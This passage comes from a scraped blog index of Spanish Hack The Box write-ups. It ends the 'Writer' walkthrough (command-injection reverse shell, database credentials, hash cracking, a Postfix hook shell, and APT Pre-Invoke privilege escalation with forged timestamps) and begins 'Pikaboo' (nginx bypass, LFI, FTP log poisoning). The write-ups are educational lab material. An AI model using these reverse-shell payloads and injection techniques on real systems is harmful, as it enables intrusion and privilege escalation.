3, seq 2, length 64 13:40:49.837674 IP 10.10.10.10 \u0026gt; writer.htb: ICMP echo reply, id 3, seq 2, length 64 13:40:50.856927 IP writer.htb \u0026gt; 10.10.10.10: ICMP echo request, id 3, seq 3, length 64 13:40:50.856956 IP 10.10.10.10 \u0026gt; writer.htb: ICMP echo reply, id 3, seq 3, length 64 13:40:51.273306 IP writer.htb \u0026gt; 10.10.10.10: ICMP echo request, id 4, seq 1, length 64 13:40:51.273354 IP 10.10.10.10 \u0026gt; writer.htb: ICMP echo reply, id 4, seq 1, length 64 13:40:52.189992 IP writer.htb \u0026gt; 10.10.10.10: ICMP echo request, id 4, seq 2, length 64 13:40:52.190032 IP 10.10.10.10 \u0026gt; writer.htb: ICMP echo reply, id 4, seq 2, length 64 13:40:53.110992 IP writer.htb \u0026gt; 10.10.10.10: ICMP echo request, id 4, seq 3, length 64 13:40:53.111020 IP 10.10.10.10 \u0026gt; writer.htb: ICMP echo reply, id 4, seq 3, length 64 User - www-data Como sabemos es posible ejecutar comandos, esta vez cambiamos el nombre del archivo con una shell inversa y realizando nuevamente lo anterior.\n1 img.jpg;python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.10\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;; Con ello logramos obtener una shell como www-data.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/writer ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.10.10] from writer.htb [10.10.11.101] 38774 sh: 0: can\u0026#39;t access tty; job control turned off python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@writer:/$ whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) / www-data@writer:/$ Django App Tras realizar una enumeracion encontramos una app de Django donde vemos en la configuracion de la base de datos el archivo de MySQL, al revisar este archivo encontramos las credenciales para la base de datos dev utilizada por esta aplicacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 www-data@writer:/var/www/writer2_project$ ls -lah total 32K drwxrws--- 6 www-data smbgroup 4.0K Aug 2 06:52 . drwxr-xr-x 5 root root 4.0K Jun 22 17:55 .. -r-xr-sr-x 1 www-data smbgroup 806 Sep 16 18:32 manage.py -r-xr-sr-x 1 www-data smbgroup 15 Sep 16 18:32 requirements.txt dr-xr-sr-x 3 www-data smbgroup 4.0K May 16 20:29 static dr-xr-sr-x 4 www-data smbgroup 4.0K Jul 9 10:59 staticfiles dr-xr-sr-x 4 www-data smbgroup 4.0K May 19 15:26 writer_web dr-xr-sr-x 3 www-data smbgroup 4.0K May 19 12:32 writerv2 www-data@writer:/var/www/writer2_project$ cat manage.py #!/usr/bin/env python import os import sys if __name__ == \u0026#34;__main__\u0026#34;: os.environ.setdefault(\u0026#34;DJANGO_SETTINGS_MODULE\u0026#34;, \u0026#34;writerv2.settings\u0026#34;) try: from django.core.management import execute_from_command_line except ImportError: # The above import may fail for some other reason. Ensure that the # issue is really that Django is missing to avoid masking other # exceptions on Python 2. try: import django except ImportError: raise ImportError( \u0026#34;Couldn\u0026#39;t import Django. Are you sure it\u0026#39;s installed and \u0026#34; \u0026#34;available on your PYTHONPATH environment variable? Did you \u0026#34; \u0026#34;forget to activate a virtual environment?\u0026#34; ) raise execute_from_command_line(sys.argv) www-data@writer:/var/www/writer2_project/writerv2$ cd writerv2 www-data@writer:/var/www/writer2_project/writerv2$ cat settings.py [... REDACTED ...] # Database # https://docs.djangoproject.com/en/1.10/ref/settings/#databases DATABASES = { \u0026#39;default\u0026#39;: { \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;, \u0026#39;OPTIONS\u0026#39;: { \u0026#39;read_default_file\u0026#39;: \u0026#39;/etc/mysql/my.cnf\u0026#39;, }, } } [... REDACTED ...] www-data@writer:/var/www/writer2_project/writerv2$ cat /etc/mysql/my.cnf|grep -v \u0026#34;#\u0026#34; [client-server] !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/ [client] database = dev user = djangouser password = DjangoSuperPassword default-character-set = utf8 www-data@writer:/var/www/writer2_project/writerv2$ Al ingresar con las credenciales con mysql encontramos la contraseña encriptada del usuario kyle.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 www-data@writer:/var/www/writer2_project$ mysql -u djangouser -p Password: DjangoSuperPassword Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 143 Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04 Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MariaDB [dev]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | dev | | information_schema | +--------------------+ 2 rows in set (0.000 sec) MariaDB [dev]\u0026gt; show tables; +----------------------------+ | Tables_in_dev | +----------------------------+ | auth_group | | auth_group_permissions | | auth_permission | | auth_user | | auth_user_groups | | auth_user_user_permissions | | django_admin_log | | django_content_type | | django_migrations | | django_session | +----------------------------+ 10 rows in set (0.000 sec) MariaDB [dev]\u0026gt; describe auth_user; +--------------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +--------------+--------------+------+-----+---------+----------------+ | id | int(11) | NO | PRI | NULL | auto_increment | | password | varchar(128) | NO | | NULL | | | last_login | datetime(6) | YES | | NULL | | | is_superuser | tinyint(1) | NO | | NULL | | | username | varchar(150) | NO | UNI | NULL | | | first_name | varchar(150) | NO | | NULL | | | last_name | varchar(150) | NO | | NULL | | | email | varchar(254) | NO | | NULL | | | is_staff | tinyint(1) | NO | | NULL | | | is_active | tinyint(1) | NO | | NULL | | | date_joined | datetime(6) | NO | | NULL | | +--------------+--------------+------+-----+---------+----------------+ 11 rows in set (0.001 sec) MariaDB [dev]\u0026gt; select id, password, username, email, is_staff from auth_user; +----+------------------------------------------------------------------------------------------+----------+-----------------+----------+ | id | password | username | email | is_staff | +----+------------------------------------------------------------------------------------------+----------+-----------------+----------+ | 1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | kyle | kyle@writer.htb | 1 | +----+------------------------------------------------------------------------------------------+----------+-----------------+----------+ 1 row in set (0.000 sec) MariaDB [dev]\u0026gt; Cracking Hash El hash muestra pbkdf2_sha256, segun los ejemplos de hashcat muestran que el modo para este hash es 10000. Utilizamos hashcat -m 10000 hash_kyle /usr/share/wordlists/rockyou.txt.\n1 pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio User - Kyle Con la contraseña encontrada ingresamos por SSH, obteniendo la primera flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/writer ❯ ssh kyle@writer.htb # marcoantonio kyle@writer.htb\u0026#39;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) [... ... ] kyle@writer:~$ whoami; pwd kyle /home/kyle kyle@writer:~$ ls user.txt kyle@writer:~$ cat user.txt 86ac6aa69aa67b492caec63ba8e96fc8 kyle@writer:~$ Postfish Vemos que kyle pertenece al grupo filter, tras realizar una busqueda con este grupo vemos postfix (un servidor de correo), tambien en los puertos locales esta abierto el puerto 25 (smtp).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 kyle@writer:~$ id uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup) kyle@writer:~$ find / -group filter 2\u0026gt;/dev/null /etc/postfix/disclaimer /var/spool/filter kyle@writer:~$ netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:139 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8080 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:445 0.0.0.0:* LISTEN - tcp6 0 0 :::139 :::* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::445 :::* LISTEN - kyle@writer:~$ Encontramos tambien que es posible ejecutar comandos tras agregar un comando en el archivo /etc/postfix/disclaimer y vemos los correos en \u0026ldquo;disponibles\u0026rdquo; de root y kyle.\n1 2 3 kyle@writer:~$ cat /etc/postfix/disclaimer_addresses root@writer.htb kyle@writer.htb User - John Editamos el archivo /etc/postfix/disclaimer agregando una shell inversa en python.\n1 python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.10\u0026#34;,1339));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; Enviamos un correo a root a traves de netcat en el puerto 25.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 kyle@writer:~$ nc -v 127.0.0.1 25 Connection to 127.0.0.1 25 port [tcp/smtp] succeeded! 220 writer.htb ESMTP Postfix (Ubuntu) MAIL FROM: kyle@writer.htb 250 2.1.0 Ok RCPT TO: root@writer.htb 250 2.1.5 Ok DATA 354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt; Hello . 250 2.0.0 Ok: queued as 37D897EC QUIT 221 2.0.0 Bye kyle@writer:~$ Finalmente pusimos a la escucha netcat donde logramos obtener una shell con el usuario john, que luego actualizamos por una shell SSH utilizando su clave privada.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 π ~/htb/writer ❯ rlwrap nc -lvp 1339 listening on [any] 1339 ... connect to [10.10.10.10] from writer.htb [10.10.11.101] 38884 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; john@writer:/var/spool/postfix$ whoami;pwd;id john /var/spool/postfix uid=1001(john) gid=1001(john) groups=1001(john) john@writer:/var/spool/postfix$ cd bash: cd: HOME not set john@writer:/var/spool/postfix$ cd /home/john john@writer:/home/john$ ls -lah total 28K drwxr-xr-x 4 john john 4.0K Aug 5 09:56 . drwxr-xr-x 4 root root 4.0K Jul 9 10:59 .. lrwxrwxrwx 1 root root 9 May 19 22:20 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 john john 220 May 14 18:19 .bash_logout -rw-r--r-- 1 john john 3.7K May 14 18:19 .bashrc drwx------ 2 john john 4.0K Jul 28 09:19 .cache -rw-r--r-- 1 john john 807 May 14 18:19 .profile drwx------ 2 john john 4.0K Jul 9 12:29 .ssh john@writer:/home/john$ cd .ssh john@writer:/home/john/.ssh$ ls -lah total 20K drwx------ 2 john john 4.0K Jul 9 12:29 . drwxr-xr-x 4 john john 4.0K Aug 5 09:56 .. -rw-r--r-- 1 john john 565 Jul 9 12:29 authorized_keys -rw------- 1 john john 2.6K Jul 9 12:29 id_rsa -rw-r--r-- 1 john john 565 Jul 9 12:29 id_rsa.pub john@writer:/home/john/.ssh$ cat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAxqOWLbG36VBpFEz2ENaw0DfwMRLJdD3QpaIApp27SvktsWY3hOJz wC4+LHoqnJpIdi/qLDnTx5v8vB67K04f+4FJl2fYVSwwMIrfc/+CHxcTrrw+uIRVIiUuKF [.. snip ..] Vikbn3mEwRCjFa5XcRP9VX8nhwVoRGuf8QmD0beSm8WUb8wKBVkmNoPZNGNJb0xvSmFEJ/ BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh54f Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw== -----END OPENSSH PRIVATE KEY----- john@writer:/home/john/.ssh$ Privesc Tras obtener una shell más comoda por SSH, observamos que el usuario John pertenece al grupo management, encontramos que la carpeta apt.conf.d pertenece al mismo grupo, dicha carpeta contiene distintos archivos de instrucciones para la configuracion de APT. A pesar de tener acceso a la carpeta mencionada no se tienen permisos para ejecutar apt como root.\n1 2 3 4 5 john@writer:~$ id uid=1001(john) gid=1001(john) groups=1001(john),1003(management) john@writer:~$ find / -group management 2\u0026gt;/dev/null /etc/apt/apt.conf.d john@writer:~$ Tras la ejecucion de pspy encontramos que existe un cronjob que ejecuta multiples comandos, entre ellos se destacan, el comando find que busca archivos en la carpeta apt.conf.d/ que fueron creados o modificados en las ultimas 24 horas que finalmente son borrados, y, tambien apt-get update, los demás comandos realizan un \u0026ldquo;backup\u0026rdquo; de archivos de configuracion y otro, la ejecucion de la aplicacion Django.\n1 2 3 4 5 6 7 8 9 10 11 12 2021/09/16 22:40:01 CMD: UID=0 PID=19835 | /usr/sbin/CRON -f 2021/09/16 22:40:01 CMD: UID=0 PID=19834 | 2021/09/16 22:40:01 CMD: UID=0 PID=19838 | /usr/sbin/CRON -f 2021/09/16 22:40:01 CMD: UID=0 PID=19840 | /bin/sh -c /usr/bin/cp -r /root/.scripts/writer2_project /var/www/ 2021/09/16 22:40:01 CMD: UID=0 PID=19839 | /bin/sh -c /usr/bin/cp /root/.scripts/master.cf /etc/postfix/master.cf 2021/09/16 22:40:01 CMD: UID=0 PID=19841 | /bin/sh -c /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} \\; 2021/09/16 22:40:01 CMD: UID=0 PID=19842 | /bin/sh -c /usr/bin/cp /root/.scripts/disclaimer /etc/postfix/disclaimer 2021/09/16 22:40:01 CMD: UID=0 PID=19843 | /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} ; 2021/09/16 22:40:01 CMD: UID=0 PID=19844 | /bin/sh -c /usr/bin/apt-get update 2021/09/16 22:40:01 CMD: UID=0 PID=19845 | /usr/bin/dpkg --print-foreign-architectures 2021/09/16 22:40:02 CMD: UID=33 PID=19847 | python3 manage.py runserver 127.0.0.1:8080 2021/09/16 22:40:02 CMD: UID=0 PID=19850 | /usr/bin/apt-get update Sabemos que apt-get update es ejecutado por el usuario root y además tenemos acceso a la carpeta de configuracion de apt.\nCreamos un archivo de configuracion (nombre del archivo: sckull) que contiene la ejecucion de una shell inversa. Para poder \u0026ldquo;saltar\u0026rdquo; el comando (que borra archivos) utilizamos touch para crear un archivo con fecha 1980 que ayudará a darle la misma fecha al archivo de configuracion (sckull), si vemos el archivo de configuracion (sckull) tiene una fecha antigua. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 john@writer:/etc/apt/apt.conf.d$ echo \u0026#39;apt::Update::Pre-Invoke {\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1333 \u0026gt;/tmp/f\u0026#34;};\u0026#39; \u0026gt; sckull john@writer:/etc/apt/apt.conf.d$ touch -t 8001031305 old john@writer:/etc/apt/apt.conf.d$ touch -r old sckull john@writer:/etc/apt/apt.conf.d$ ls -lah total 52K drwxrwxr-x 2 root management 4.0K Sep 16 21:22 . drwxr-xr-x 7 root root 4.0K Jul 9 10:59 .. -rw-r--r-- 1 root root 630 Apr 9 2020 01autoremove -rw-r--r-- 1 root root 92 Apr 9 2020 01-vendor-ubuntu -rw-r--r-- 1 root root 129 Dec 4 2020 10periodic -rw-r--r-- 1 root root 108 Dec 4 2020 15update-stam -rw-r--r-- 1 root root 85 Dec 4 2020 20archive -rw-r--r-- 1 root root 1.1K Sep 23 2020 20packagekit -rw-r--r-- 1 root root 114 Nov 19 2020 20snapd.conf -rw-r--r-- 1 root root 625 Oct 7 2019 50command-not-found -rw-r--r-- 1 root root 182 Aug 3 2019 70debconf -rw-r--r-- 1 root root 305 Dec 4 2020 99update-notifier -rw-rw-r-- 1 john john 0 Jan 3 1980 old -rw-rw-r-- 1 john john 108 Jan 3 1980 sckull john@writer:/etc/apt/apt.conf.d$ Despues de esperar algunos segundos el archivo es ejecutado, obtuvimos una shell como usuario root, y, acceder a la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/writer ❯ nc -lvp 1333 listening on [any] 1333 ... connect to [10.10.10.10] from writer.htb [10.10.11.101] 59774 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@writer:/tmp# whoami; id whoami; id root uid=0(root) gid=0(root) groups=0(root) root@writer:/tmp# cd /root cd /root root@writer:~# ls ls root.txt snap root@writer:~# cat root.txt cat root.txt fafd460dab76a4e56bb7534110fada9f root@writer:~# ``` ","description":"En Writer encontramos una vulnerabilidad 'SQL Injection' que nos permitió obtener el codigo fuente del sitio, para luego realizar 'Command Injection' y acceder a la maquina. Credenciales para la base de datos nos dieron acceso a un siguiente usuario. Por medio de Postfish obtuvimos acceso a un segundo usuario. Finalmente escalamos privilegios utilizando un archivo de configuracion para APT.","id":40,"section":"posts","tags":["sqli","postfish","sqlmap","apt","flask","django","smb"],"title":"Hack The Box - Writer","uri":"https://sckull.github.io/posts/writer/"},{"content":"\rPikaboo presenta una vulnerabilidad LFI donde realizamos LFI Log Poisoning por donde obtuvimos acceso. Acceso por LDAP localmente nos permitio acceder a otro usuario por FTP. Finalmente para escalar privilegios explotamos una vulnerabilidad en una funcion de perl.\nNombre Pikaboo OS Linux Puntos 40 Dificultad Dificil IP 10.10.10.249 Maker pwnmeow polarbearer Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.7, 5.4, 4.8, 5.2, 4.6],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} RECON NMAP Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http (80), ftp (21), ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.91 scan initiated Mon Jul 19 19:51:31 2021 as: nmap -Pn -sV -sC -p21,22,80 -oN scans 10.10.10.249 Nmap scan report for 10.10.10.249 (10.10.10.249) Host is up (0.25s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA) | 256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA) |_ 256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Pikaboo Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Jul 19 19:51:46 2021 -- 1 IP address (1 host up) scanned in 15.09 seconds FTP El puerto 21 (FTP) no acepta conexiones anonimas.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/pikaboo ❯ ftp 10.10.10.249 Connected to 10.10.10.249. 220 (vsFTPd 3.0.3) Name (10.10.10.249:kali): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp\u0026gt; bye 221 Goodbye. Web Site Vemos una pagina en el puerto 80, parece ser estatica.\nUna lista de nombres con la descripcion de cada uno de estas imagenes podrian servir para posibles nombres de usuario. Además cada imagen nos redirige hacia una \u0026ldquo;API\u0026rdquo; pero se muestra el mensaje PokeAPI Integration - Coming soon!.\nEn Contacto observamos un formulario pero en el codigo fuente no vemos que realice alguna solicitud.\nDirectory Brute Forcing Realizamos una busqueda de directorios, aunque solo se muestran mayormente direcciones hacia un panel de administracion y direcciones ya conocidas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/pikaboo ❯ feroxbuster --resume-from ferox-http_10_10_10_249_-1626739710.state ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.249/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 319c http://10.10.10.249/images 200 208l 477w 6922c http://10.10.10.249/index.php 200 92l 213w 3180c http://10.10.10.249/contact.php 401 14l 54w 456c http://10.10.10.249/admin 401 14l 54w 456c http://10.10.10.249/administration 401 14l 54w 456c http://10.10.10.249/administrator 401 14l 54w 456c http://10.10.10.249/administr8 401 14l 54w 456c http://10.10.10.249/administrative 401 14l 54w 456c http://10.10.10.249/administratie 401 14l 54w 456c http://10.10.10.249/admins 401 14l 54w 456c http://10.10.10.249/admin_images 401 14l 54w 456c http://10.10.10.249/administrivia Bypass Panel - nginx PANEL Las direcciones de administracion presentan Autenticacion Basica. Intentamos realizar un ataque de fuerza bruta con los nombres en \u0026ldquo;Pokatdex\u0026rdquo; pero no resulto nada. Además vemos que las solicitudes del panel se realizan hacia 127.0.0.1:81 atraves de Apache, tal vez es algun tipo de Proxy configurado en Nginx hacia Apache.\nLa version de la maquina es 1.14.2 es inferior a la version estable actual lo que podria suponer algun tipo de vulnerabilidad, tomando en cuenta esto y el \u0026ldquo;Proxy\u0026rdquo; nos llevó a Nginx misconfigurations ( 1, 2, 3, 4) y Reverse Proxy Attacks, similar a HTB - Seal.\nDe cierta forma deberíamos intentar realizar Bypass, en este caso en el panel de administracion, es por ello que tomamos en cuenta los \u0026ldquo;payloads\u0026rdquo; para Nginx y realizamos nuevamente una enumeracion de directorios con Feroxbuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/pikaboo ❯ feroxbuster -u \u0026#34;http://10.10.10.249/admin../\u0026#34; -w $MD ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.249/admin../ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 401 14l 54w 456c http://10.10.10.249/admin../admin 301 9l 28w 314c http://10.10.10.249/admin../javascript 200 93l 285w 4640c http://10.10.10.249/admin../server-status [####################] - 9m 220545/220545 0s found:3 errors:0 [####################] - 8m 220545/220545 408/s http://10.10.10.249/admin../ Se muestran algunas direcciones pero en server-status observamos la direccion /admin_stagin y las solicitudes hechas por feroxbuster.\nAl visitar /admin_stagin nos redirige al puerto 81 de localhost, agregando / al final nos muestra el contenido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 π ~/htb/pikaboo ❯ curl -s http://10.10.10.249/admin../admin_staging \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;301 Moved Permanently\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Moved Permanently\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://127.0.0.1:81/admin_staging/\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; π ~/htb/pikaboo ❯ curl -s http://10.10.10.249/admin../admin_staging/ | head \u0026lt;!-- ========================================================= Material Dashboard - v2.1.2 ========================================================= Product Page: https://www.creative-tim.com/product/material-dashboard Copyright 2020 Creative Tim (https://www.creative-tim.com) Coded by Creative Tim ========================================================= π ~/htb/pikaboo ❯ Observamos informacion y multiples direcciones.\nLFI Tras cambiar a una direccion vemos que toma un archivo PHP y lo muestra en pantalla, lo que nos lleva a una vulnerabilidad LFI.\nUtilizando un wrapper de php, obtuvimos el codigo de index.php donde vemos el codigo vulnerable.\n1 2 3 4 5 6 7 8 9 10 /*php://filter/convert.base64-encode/resource=index.php*/ \u0026lt;?php if(isset($_GET[\u0026#39;page\u0026#39;])) { include($_GET[\u0026#39;page\u0026#39;]); } else { include(\u0026#34;dashboard.php\u0026#34;); } ?\u0026gt; LFI Log Poisoning Utilizamos un wordlist con WFFUZ y, encontramos algunos archivos de log.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 π ~/htb/pikaboo ❯ wfuzz -c -w file_inclusion_linux.txt --hl 367 -u \u0026#34;http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ\u0026#34; ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ Total requests: 2247 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000001803: 200 999 L 4802 W 61821 Ch \u0026#34;/var/log/dpkg.log\u0026#34; 000001974: 200 413 L 1670 W 19803 Ch \u0026#34;/var/log/vsftpd.log\u0026#34; 000001977: 200 555 L 1376 W 162752 Ch \u0026#34;/var/log/wtmp\u0026#34; Total time: 73.18061 Processed Requests: 2247 Filtered Requests: 2244 Requests/sec.: 30.70485 Vemos algunas solicitudes en el log de FTP (vsftpd.log) aunque no vemos credenciales en texto plano. Realizamos una solicitud en el puerto FTP tomando como usuario un payload para verificar que el codigo en PHP sea ejecutado.\n1 \u0026lt;?php echo(system(\u0026#39;whoami\u0026#39;)); ?\u0026gt; Al verificar el log vemos que el 